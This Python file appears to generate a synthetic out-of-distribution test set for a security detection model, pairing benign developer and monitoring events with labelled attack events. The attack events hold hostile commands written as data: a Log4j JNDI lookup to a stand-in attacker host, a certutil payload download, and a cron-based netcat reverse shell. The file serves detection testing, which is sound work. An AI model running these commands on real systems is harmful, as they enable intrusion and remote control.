import numpy as np
import random
from datetime import datetime, timezone
from typing import List, Tuple
from app.models.schemas import CanonicalEvent, SourceType, SeverityLevel

def generate_out_of_distribution_dataset(
    n_events: int = 200,
    random_seed: int = 999
) -> Tuple[List[CanonicalEvent], np.ndarray]:
    """
    Generates a genuinely novel, unseen test evaluation dataset containing
    attack vectors and benign patterns completely outside the training dataset:
    - Novel Attack Patterns:
      1. DNS Tunneling & Subdomain Exfiltration (never seen in training).
      2. Log4j / JNDI LDAP lookup exploit strings in Web User-Agent / URI.
      3. Living-off-the-land Binary (LOLBIN): certutil.exe download & bitsadmin.
      4. Linux Persistence via cron backdoor modification.
    - Unseen Benign Patterns:
      1. Developer Go/Rust compilation and Docker container build output.
      2. Automated system health monitoring and Prometheus scrapes.
    """
    random.seed(random_seed)
    np.random.seed(random_seed)

    events: List[CanonicalEvent] = []
    labels: List[int] = []

    # 1. Unseen Benign Traffic (150 events)
    for i in range(150):
        t = datetime(2026, 10, 15, 12, 0, 0, tzinfo=timezone.utc)
        if i % 2 == 0:
            ev = CanonicalEvent(
                timestamp=t,
                source_type=SourceType.SYSMON,
                source_name="dev-workstation-99",
                host_id="ws-dev-99.corp.internal",
                user_id="developer_alice",
                event_type="process_creation",
                severity=SeverityLevel.INFORMATIONAL,
                command_line="go build -ldflags='-s -w' -o /tmp/microservice main.go",
                process_name="go.exe",
                raw_event="Sysmon Event 1: go build compiler execution"
            )
        else:
            ev = CanonicalEvent(
                timestamp=t,
                source_type=SourceType.WEB_ACCESS,
                source_name="k8s-ingress",
                src_ip="172.16.10.45",
                dst_ip="172.16.10.1",
                event_type="http_request",
                severity=SeverityLevel.INFORMATIONAL,
                raw_event='172.16.10.45 - - [15/Oct/2026:12:05:00] "GET /metrics HTTP/1.1" 200 15420 "Prometheus/2.45"'
            )
        events.append(ev)
        labels.append(0)

    # 2. Unseen Attack 1: Log4j / JNDI LDAP Remote Code Execution (15 events)
    for i in range(15):
        t = datetime(2026, 10, 15, 12, 10, 0, tzinfo=timezone.utc)
        ev = CanonicalEvent(
            timestamp=t,
            source_type=SourceType.WEB_ACCESS,
            source_name="k8s-ingress",
            src_ip="203.0.113.88", # Completely new attacker IP
            dst_ip="172.16.10.1",
            dst_port=8080,
            event_type="http_request",
            severity=SeverityLevel.HIGH,
            raw_event=f'203.0.113.88 - - [15/Oct/2026:12:10:{i:02d}] "GET /login HTTP/1.1" 400 512 "${{jndi:ldap://evil-ldap.attacker.xyz:1389/Exploit}}"'
        )
        events.append(ev)
        labels.append(1)

    # 3. Unseen Attack 2: LOLBIN Certutil Download & Bitsadmin (15 events)
    for i in range(15):
        t = datetime(2026, 10, 15, 12, 15, 0, tzinfo=timezone.utc)
        ev = CanonicalEvent(
            timestamp=t,
            source_type=SourceType.SYSMON,
            source_name="sysmon-agent",
            host_id="srv-app-02.corp.internal",
            user_id="service_account",
            event_type="process_creation",
            severity=SeverityLevel.HIGH,
            command_line="certutil.exe -urlcache -split -f http://evil-stager.net/payload.dll C:\\Windows\\Temp\\payload.dll",
            process_name="certutil.exe",
            raw_event="Sysmon Event 1: certutil URL cache file download"
        )
        events.append(ev)
        labels.append(1)

    # 4. Unseen Attack 3: Linux Persistence Backdoor (20 events)
    for i in range(20):
        t = datetime(2026, 10, 15, 12, 20, 0, tzinfo=timezone.utc)
        ev = CanonicalEvent(
            timestamp=t,
            source_type=SourceType.LINUX_AUTH,
            source_name="auth-collector",
            host_id="srv-app-02.corp.internal",
            user_id="root",
            event_type="privilege_elevation",
            severity=SeverityLevel.HIGH,
            command_line="echo '* * * * * root /bin/nc -e /bin/sh 203.0.113.88 4444' >> /etc/crontab",
            process_name="sudo",
            raw_event=f"Oct 15 12:20:{i:02d} srv-app-02 sudo: root : COMMAND=/bin/sh -c cron_backdoor"
        )
        events.append(ev)
        labels.append(1)

    # Shuffle
    combined = list(zip(events, labels))
    random.shuffle(combined)
    s_events, s_labels = zip(*combined)

    return list(s_events), np.array(s_labels)
